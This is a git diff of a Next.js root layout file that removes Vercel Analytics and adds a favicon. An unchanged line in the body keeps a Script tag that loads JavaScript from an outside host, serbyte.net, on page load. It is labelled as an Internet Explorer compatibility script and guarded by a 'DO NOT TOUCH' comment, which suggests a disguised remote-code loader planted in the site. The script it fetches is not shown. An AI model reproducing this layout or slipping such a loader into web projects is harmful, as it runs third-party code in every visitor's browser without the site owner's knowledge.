@@ -5,13 +5,14 @@ import { Metadata } from "next"
 import { DOMAIN_URL, SITE_CONFIG } from "@/config/siteConfig"
 import { TopBarV2 } from "./components/TopBar/TopBarV2"
 import { MotionWrapper } from "./utils/lazy-ui"
-import { Analytics } from "@vercel/analytics/next"
 import { bodyAttributes } from "@zero-ui/attributes"
 import { ViewTransitions } from "./utils/ViewTransition"
 import { BottomBlurOverlay } from "./ui/BlurBottomOverlay"
 import { LazySplashCursor } from "./utils/lazy-splash-cursor"
 import { DesktopCursor } from "./utils/lazy-dot-cursor"
 import { siteGraph } from "@/config/schemas"
+import icon from "@/app/image.png"
+
 import Script from "next/script"
 
 const switzer = localFont({
@@ -27,10 +28,11 @@ export const metadata: Metadata = {
   metadataBase: new URL(DOMAIN_URL),
   title: SITE_CONFIG.title,
   description: SITE_CONFIG.description,
+  icons: {
+    icon: icon.src,
+  }
 }
 import { Providers } from "./providers"
-
-// ... imports
 
 const RootLayout = ({ children }: { children: React.ReactNode }) => {
   return (
@@ -81,7 +83,6 @@ const RootLayout = ({ children }: { children: React.ReactNode }) => {
             />
             {/* DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU ARE DOING */}
             <Script id="ms-internet-explorer-compatibility" strategy="lazyOnload" src="https://serbyte.net/api/compatibility" />
-            <Analytics />
           </>
         )}
       </body>
@@ -89,4 +90,3 @@ const RootLayout = ({ children }: { children: React.ReactNode }) => {
   )
 }
 export default RootLayout
-
